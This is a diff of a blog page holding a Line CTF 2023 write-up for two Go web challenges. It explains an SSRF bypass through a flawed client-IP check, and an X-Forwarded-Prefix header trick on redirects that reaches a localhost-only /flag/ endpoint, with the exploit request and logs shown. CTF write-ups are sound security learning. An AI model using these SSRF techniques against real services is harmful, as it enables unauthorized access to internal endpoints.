@@ -35,23 +35,24 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.3" />
-<meta property="og:title" content="404: Page not found" />
+<meta property="og:title" content="Line CTF 2023 Write Up" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<meta property="og:description" content="A minimal, responsive and feature-rich Jekyll theme for technical writing." />
-<link rel="canonical" href="http://localhost:4000/404.html" />
-<meta property="og:url" content="http://localhost:4000/404.html" />
+<meta name="description" content="This article is about write-up for the Line ctf 2023. there is only two web challenges, both of which contain an SSRF bug" />
+<meta property="og:description" content="This article is about write-up for the Line ctf 2023. there is only two web challenges, both of which contain an SSRF bug" />
+<link rel="canonical" href="http://localhost:4000/posts/Line-CTF/" />
+<meta property="og:url" content="http://localhost:4000/posts/Line-CTF/" />
 <meta property="og:site_name" content="Web2.0" />
-<meta property="og:type" content="website" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-26T18:00:53+09:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="404: Page not found" />
+<meta property="twitter:title" content="Line CTF 2023 Write Up" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","description":"A minimal, responsive and feature-rich Jekyll theme for technical writing.","headline":"404: Page not found","url":"http://localhost:4000/404.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-26T18:00:53+09:00","datePublished":"2023-03-26T18:00:53+09:00","description":"This article is about write-up for the Line ctf 2023. there is only two web challenges, both of which contain an SSRF bug","headline":"Line CTF 2023 Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Line-CTF/"},"url":"http://localhost:4000/posts/Line-CTF/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>404: Page not found | Web2.0
+  <title>Line CTF 2023 Write Up | Web2.0
   </title>
 
   <!--
@@ -100,6 +101,8 @@
 
   <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
 
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
   
 
   
@@ -555,8 +558,10 @@
           
         
           
+        
+          
             
-              <span>404: Page not found</span>
+              <span>Line CTF 2023 Write Up</span>
             
 
           
@@ -570,7 +575,7 @@
     </button>
 
     <div id="topbar-title">
-      404: Page not found
+      Post
     </div>
 
     <button type="button" id="search-trigger" class="btn btn-link">
@@ -624,6 +629,85 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
 
 <!-- Add header for code snippets -->
 
@@ -664,21 +748,343 @@
 
 
 <article class="px-1">
+  <header>
+    <h1 data-toc-skip>Line CTF 2023 Write Up</h1>
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
   
-    
-    
-    <h1 class="dynamic-title">
-      404: Page not found
-    </h1>
-    <div class="content">
+  data-ts="1679821253"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Mar 26, 2023
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
       
 
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://x.com/l0ptus">anonymous</a>
+            
+          </em>
+        </span>
+
+        <!-- read time -->
+        <!-- Calculate the post's reading time, and display the word count in tooltip -->
 
 
-<p class="lead">Sorry, we've misplaced that URL or it's pointing to something that doesn't exist.</p>
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="791 words"
+>
+  <em>4 min</em> read</span>
+
+      </div>
+      <!-- .d-flex -->
+    </div>
+    <!-- .post-meta -->
+  </header>
+
+  <div class="content">
+    <ul>
+  <li><a href="#web-baby-simple-gocurl">(Web) Baby Simple Gocurl </a></li>
+  <li><a href="#web-adult-simple-gocurl">(Web) Adult Simple Gocurl</a></li>
+</ul>
+
+<p>These two challenges require reading flag in the <code class="language-plaintext highlighter-rouge">/flag/</code> path via SSRF.</p>
+
+<hr />
+<h1 id="web-baby-simple-gocurl">(Web) Baby Simple Gocurl</h1>
+
+<div class="language-javascript highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nx">n</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">)</span> <span class="o">||</span> <span class="nx">n</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="p">)</span> <span class="p">?</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">n</span><span class="p">,</span> <span class="dl">"</span><span class="s2">_self</span><span class="dl">"</span><span class="p">)</span> <span class="p">:</span> <span class="nx">r</span><span class="p">.</span><span class="nx">router</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">redirect_link</span> <span class="p">?</span> <span class="nx">n</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">/portal</span><span class="dl">"</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<pre><code class="language-Go">	r.GET("/flag/", func(c *gin.Context) {
+		reqIP := strings.Split(c.Request.RemoteAddr, ":")[0]
+
+		log.Println("[+] IP : " + reqIP)
+		if reqIP == "127.0.0.1" {
+			c.JSON(http.StatusOK, gin.H{
+				"message": flag,
+			})
+			return
+		}
+
+		c.JSON(http.StatusBadRequest, gin.H{
+			"message": "You are a Guest, This is only for Host",
+		})
+	})
+</code></pre>
+<p>first, to read the <code class="language-plaintext highlighter-rouge">Flag</code>, a request must be made using the <code class="language-plaintext highlighter-rouge">127.0.0.1</code> IP.</p>
+
+<pre><code class="language-Go">	r.GET("/curl/", func(c *gin.Context) {
+		client := &amp;http.Client{
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return redirectChecker(req, via)
+			},
+		}
+
+		reqUrl := strings.ToLower(c.Query("url"))
+		reqHeaderKey := c.Query("header_key")
+		reqHeaderValue := c.Query("header_value")
+		reqIP := strings.Split(c.Request.RemoteAddr, ":")[0]
+		fmt.Println("[+] " + reqUrl + ", " + reqIP + ", " + reqHeaderKey + ", " + reqHeaderValue)
+
+		if c.ClientIP() != "127.0.0.1" &amp;&amp; (strings.Contains(reqUrl, "flag") || strings.Contains(reqUrl, "curl") || strings.Contains(reqUrl, "%")) {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+
+		req, err := http.NewRequest("GET", reqUrl, nil)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+
+		if reqHeaderKey != "" || reqHeaderValue != "" {
+			req.Header.Set(reqHeaderKey, reqHeaderValue)
+		}
+
+		resp, err := client.Do(req)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+
+		defer resp.Body.Close()
+
+		bodyText, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+		statusText := resp.Status
+
+		c.JSON(http.StatusOK, gin.H{
+			"body":   string(bodyText),
+			"status": statusText,
+		})
+	})
+</code></pre>
+<p>in this challenge, we can use the http module to send a request to the desired web service and get the response value.</p>
+
+<p>Get the parameter values of <code class="language-plaintext highlighter-rouge">url</code>, <code class="language-plaintext highlighter-rouge">header_key</code>, and <code class="language-plaintext highlighter-rouge">header_value</code> from the parameters received from the user.</p>
+
+<pre><code class="language-Go">		if c.ClientIP() != "127.0.0.1" &amp;&amp; (strings.Contains(reqUrl, "flag") || strings.Contains(reqUrl, "curl") || strings.Contains(reqUrl, "%")) {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+</code></pre>
+<p>but this challenge has a validation process as above. The IP of the user we currently delivered must be <code class="language-plaintext highlighter-rouge">127.0.0.1</code>, and the characters <code class="language-plaintext highlighter-rouge">flag</code>, <code class="language-plaintext highlighter-rouge">curl</code>, <code class="language-plaintext highlighter-rouge">%</code> must not be included in the url value we sent.</p>
+
+<pre><code class="language-Go">if c.ClientIP() != "127.0.0.1" &amp;&amp; (strings.Contains(reqUrl, "flag") || strings.Contains(reqUrl, "curl") || strings.Contains(reqUrl, "%"))
+</code></pre>
+<p>oops but the conditional statement is a bit weird. we can bypass this by making it operate like false &amp;&amp; true.</p>
+
+<pre><code class="language-Go">// https://github.com/gin-gonic/gin/blob/457fabd7e14f36ca1b5f302f7247efeb4690e49c/context.go#L768
+
+// ClientIP implements one best effort algorithm to return the real client IP.
+// It calls c.RemoteIP() under the hood, to check if the remote IP is a trusted proxy or not.
+// If it is it will then try to parse the headers defined in Engine.RemoteIPHeaders (defaulting to [X-Forwarded-For, X-Real-Ip]).
+// If the headers are not syntactically valid OR the remote IP does not correspond to a trusted proxy,
+// the remote IP (coming from Request.RemoteAddr) is returned.
+</code></pre>
+<p>There is a comment as above in the part where the ClientIP() function is defined.</p>
+
+<p><a href="https://cdn.discordapp.com/attachments/1046394803270713456/1089401834793353317/2023-03-26_13.13.50.png" class="popup img-link  shimmer"><img src="https://cdn.discordapp.com/attachments/1046394803270713456/1089401834793353317/2023-03-26_13.13.50.png" alt="" loading="lazy"></a></p>
+
+<hr />
+<h1 id="web-adult-simple-gocurl">(Web) Adult Simple Gocurl</h1>
+
+<pre><code class="language-Go">		if strings.Contains(reqUrl, "flag") || strings.Contains(reqUrl, "curl") || strings.Contains(reqUrl, "%") {
+			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
+			return
+		}
+</code></pre>
+<p>all the code in this challenge is the same as baby. but the difference is the conditional statement above. we can’t bypass the conditional now</p>
+
+<pre><code class="language-Go">		if reqHeaderKey != "" || reqHeaderValue != "" {
+			req.Header.Set(reqHeaderKey, reqHeaderValue)
+		}
+</code></pre>
+<p>But we can add any HTTP headers we want using header append logic</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>=&gt; https://issues.redhat.com/browse/UNDERTOW-990?workflowName=GIT+Pull+Request+workflow+&amp;stepId=5
+
+For request which is redirected to index.html:
+$ curl -I -X GET  --header "X-Forwarded-Prefix: /test-service" "http://localhost:8624/docs"
+
+Current result is:
+HTTP/1.1 302 Found
+Location: http://localhost:8624/docs/index.html
+
+but should be:
+HTTP/1.1 302 Found
+Location: http://localhost:8624/test-service/docs/index.html
+</pre></td></tr></tbody></table></code></div></div>
+<p>Let’s see the above before the exploit. we can see that it sets the <code class="language-plaintext highlighter-rouge">X-Forwarded-Prefix: /test-service</code> header when requesting /docs. as a result, the location to be redirected normally is <code class="language-plaintext highlighter-rouge">/docs/index.html</code>, but it is redirected to <code class="language-plaintext highlighter-rouge">/test-service/docs/index.html</code>.</p>
+
+<p>in other words, if we send a request to a place that returns a 302 response and send the <code class="language-plaintext highlighter-rouge">X-Forwarded-Prefix</code> header together, we can send the request to the desired path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>[GIN-debug] redirecting request 301: / --&gt; /
+[GIN] 2023/03/26 - 13:27:32 | 200 |    1.877625ms |       127.0.0.1 | GET      "/"
+[GIN] 2023/03/26 - 13:27:32 | 200 |    3.854083ms |       127.0.0.1 | GET      "/curl/?url=http://127.0.0.1:8080//"
+</pre></td></tr></tbody></table></code></div></div>
+<p>if we send a request to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8080//</code>, we can see a 302 redirect back to the normalized path after normalizing the path. we figured out how to send a request to a place with a redirect response.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>[GIN-debug] redirecting request 301: /flag// --&gt; /flag//
+2023/03/26 13:29:25 [+] IP : 127.0.0.1
+[GIN] 2023/03/26 - 13:29:25 | 200 |      41.625µs |       127.0.0.1 | GET      "/flag/"
+[GIN] 2023/03/26 - 13:29:25 | 200 |     980.917µs |       127.0.0.1 | GET      "/curl/?url=http://127.0.0.1:8080//&amp;header_key=X-Forwarded-Prefix&amp;header_value=/flag"
+</pre></td></tr></tbody></table></code></div></div>
+<p>if we send a request like <code class="language-plaintext highlighter-rouge">http://localhost:8080/curl/?url=http://127.0.0.1:8080//&amp;header_key=X-Forwarded-Prefix&amp;header_value=/flag</code>, the redirect is executed. We can see that during this process we normalize the path using the <code class="language-plaintext highlighter-rouge">X-Forwarded-Prefix</code> header and send the request to /flag/.</p>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+
+    <!-- tags -->
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=Line%20CTF%202023%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FLine-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Line%20CTF%202023%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FLine-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FLine-CTF%2F&text=Line%20CTF%202023%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
 
     </div>
-  
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
 </article>
 
 
@@ -745,12 +1151,89 @@
             </div>
 
             
+              
+              
+
+
+
+
+            
           </aside>
         </div>
 
         <div class="row">
           <!-- tail -->
           <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/HTBCTF2023/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>HTB apocalypse CTF 2023 spybug Write Up</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/ReDos-in-Github/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>0-Day, Copy and Paste ReDoS in github.com</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!--  The comments switcher -->
+
+
             
 
             <!-- The Footer -->
@@ -925,16 +1408,44 @@ style="background-color:#030014"
 
   
 
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
 
 
-  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>
 
 
 
 
 
 
-<script defer src="/assets/js/dist/page.min.js"></script>
+<script defer src="/assets/js/dist/post.min.js"></script>
 
 
 
